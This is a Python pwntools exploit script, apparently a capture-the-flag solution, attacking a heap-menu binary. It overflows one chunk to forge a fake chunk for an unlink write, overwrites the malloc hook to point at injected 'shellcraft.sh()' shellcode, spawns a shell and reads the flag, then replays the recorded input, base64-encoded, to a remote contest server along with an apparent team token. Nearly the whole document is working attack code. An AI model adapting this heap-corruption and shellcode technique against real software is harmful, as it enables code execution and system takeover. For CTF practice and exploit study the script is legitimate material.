from pwn import *
p = process("./pwn")
context.arch = 'x86'

a = ''


def new(l, c):
    global a
    p.sendline("1")
    a += "1\n"
    p.sendline(str(l))
    a += str(l) + '\n'
    p.sendline(c)
    a += c + '\n'


def delete(idx):
    global a
    p.sendline("2")
    a += "2\n"
    p.sendline(str(idx))
    a += str(idx) + '\n'


def edit(idx, c):
    global a
    p.sendline("3")
    a += "3\n"
    p.sendline(str(idx))
    a += str(idx) + '\n'
    # a += b64e(c)
    p.send(c)
    a += c


p.recv()
new(0x5c, '0')
new(0x4c, '1')
new(0x4c, '1')
new(0x4c, '1')
new(0x4c, '1')
new(0x4c, '1')
new(0x4c, '1')
new(0x4c, '1')
edit(3, '2' * 0x4c)
payload = ''
payload += '1' * 4
payload += p32(0x49)
payload += p32(0x80eba4c - 0xc) + p32(0x80eba4c - 0x8)
payload += p32(0) * 14
payload += p32(0x48) + '\x50'
edit(3, payload)
delete(4)
'''
free hook: 0x80EB4F0
malloc hook: 0x80EA4D8
puts: 0x804FA80
0x80e9000
'''
shellcode = asm(shellcraft.sh())
edit(3, p32(0x80eba44) + '\n')
edit(0, p32(0x80e9000) + p32(0x80EA4D8) + p32(0x80eba54) + '\n')
edit(1, shellcode + '\n')
edit(2, p32(0x80e9000) + '\n')
p.sendline("1")
p.sendline("1")
p.sendline("cat flag")
a += "1\n" * 2
a += "cat flag\n"
print p.recv()
# print a
context.log_level = 'debug'
p = remote("df0a72047d6c.gamectf.com", "10001")
p.recv()
p.sendline("icq920f479998512980133aa5643203f")
p.recv()
p.sendline(b64e(a))
p.recv()
p.interactive()